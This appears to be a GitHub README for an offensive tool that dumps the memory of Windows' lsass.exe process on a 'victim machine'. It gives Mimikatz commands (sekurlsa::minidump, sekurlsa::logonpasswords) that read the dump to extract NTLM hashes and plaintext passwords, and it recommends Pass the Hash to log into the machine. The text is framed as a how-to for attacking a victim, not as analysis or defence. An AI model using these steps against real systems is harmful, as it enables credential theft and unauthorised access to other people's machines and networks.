# Dump Lsass.exe C++ & Mimikatz

Youtube Video example:
https://youtu.be/9Y67T9bIPQY

**Usage**

And now we execute into victim machine:

![image](https://github.com/S12cybersecurity/DumpLsass/assets/79543461/673fc939-1abf-4b35-8359-3e342f45b99e)

![image](https://github.com/S12cybersecurity/DumpLsass/assets/79543461/890fb4af-93a9-4c04-91c2-d64712734a07)

Now let's read this dump with mimikatz:
Mimikatz shell:

**sekurlsa::minidump C:\Users\Public\Music\lsass.dmp**

![image](https://github.com/S12cybersecurity/DumpLsass/assets/79543461/2a55eeaf-5e8e-4b39-8768-87e6e8512e0c)

**sekurlsa::logonpasswords**

![image](https://github.com/S12cybersecurity/DumpLsass/assets/79543461/600246c3-9067-4112-a643-9e2d067def20)

And we have the NTLM and we can enter the machine using Pass The Hash Tecnique, and if the user account will not be a Microsoft Account we can see the Password!
